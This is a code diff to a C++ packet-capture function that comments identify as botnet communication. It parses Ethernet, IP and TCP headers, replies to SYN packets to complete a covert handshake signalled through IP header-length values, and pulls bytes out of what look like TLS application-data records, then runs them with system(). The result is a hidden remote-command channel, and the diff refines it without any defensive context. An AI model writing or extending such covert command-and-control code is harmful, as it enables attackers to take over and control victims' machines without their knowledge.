@@ -477,11 +477,11 @@ void decapsulate(const u_char *data, int size) {
 	if (ntohs(eth_hdr->type) == 0x800) {
 		// retireve the position of the ip header
 		ih = (IPv4 *)(data + 14); //length of ethernet header
-		int length = (int)ih->ver_ihl - 64;
+		int ip_header_length = (int)ih->ver_ihl - 64;
 		
-		std::cout << length << std::endl;
-		//length 6 is reserved for ack packets on botnet communication
-		if (length > 6) {
+		std::cout << ip_header_length << std::endl;
+		//check tcp protocol
+		if ((int)ih->proto == 6) {
 			//get ip address as string
 			std::string address = "";
 			char octet[4];
@@ -511,34 +511,52 @@ void decapsulate(const u_char *data, int size) {
 			_itoa_s((int)eth_hdr->src[5], byte, 10);
 			mac_address = mac_address + byte;
 			
-			if ((int)ih->proto == 6) {
+			//check total packet length
+			int total_packet_length = ((ih->tlen & 0xFF) << 8) | ((ih->tlen >> 8) & 0xFF); //length of data
+			total_packet_length = total_packet_length - 20 - (ip_header_length * 4);
+			//assume there is layer three data
+			if(total_packet_length > 0){
 				//get tcp header
 				head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
 				th = (tcp_head *)((u_char*)ih + head_len);
 
 				std::cout << "Flags: " << (int)th->flag << std::endl;
-				//check control bit number for syn packet
-				if ((int)th->flag == 2) {
-					//send syn ack
-					send_packet(address, mac_address, "1");
-				}
 				//check control bit number for ack-psh packet
 				if ((int)th->flag == 24) {
 					//decapsulate TLS header
-					std::cout << "got it" << std::endl;
 					tls_head = (tls_header *)((u_char*)th + 20);
+
 					//have to flip bits because of memory type
-					int tls_data_len = ((tls_head->length & 0xFF) << 8) | ((tls_head->length >> 8) & 0xFF); //length of data
-					u_char* data_char = ((u_char*)tls_head + 12); //pointer to one byte of data
-					std::string command; //string that will contain command used
-					for (int i = 0; i < tls_data_len; i++) {
-						//get data
-						command = command + (char)*data_char;
-						//increment
-						data_char = data_char + 1;
+					if (tls_head->type == 23) {
+						int tls_data_len = ((tls_head->length & 0xFF) << 8) | ((tls_head->length >> 8) & 0xFF); //length of data
+						u_char* data_char = ((u_char*)tls_head + 12); //pointer to one byte of data
+						std::string command; //string that will contain command used
+						for (int i = 0; i < tls_data_len; i++) {
+							//get data
+							command = command + (char)*data_char;
+							//increment
+							data_char = data_char + 1;
+						}
+						//run command
+						int return_val = system(command.c_str());
 					}
-					//run command
-					int return_val = system(command.c_str());
+				}
+
+			}
+			else {
+				//length 6 is reserved for ack packets
+				//on botnet communication to complete handshake
+				if (ip_header_length > 6) {
+					//get tcp header
+					head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
+					th = (tcp_head *)((u_char*)ih + head_len);
+
+					//check control bit number for syn packet
+					if ((int)th->flag == 2) {
+						//send syn ack
+						send_packet(address, mac_address, "1");
+					}
+
 				}
 			}
 		}
@@ -546,7 +564,6 @@ void decapsulate(const u_char *data, int size) {
 		//get udp header = pointer + length of ipheader
 		/*head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
 		uh = (udp_header *)((u_char*)ih + head_len);*/
-
 
 	}
 }
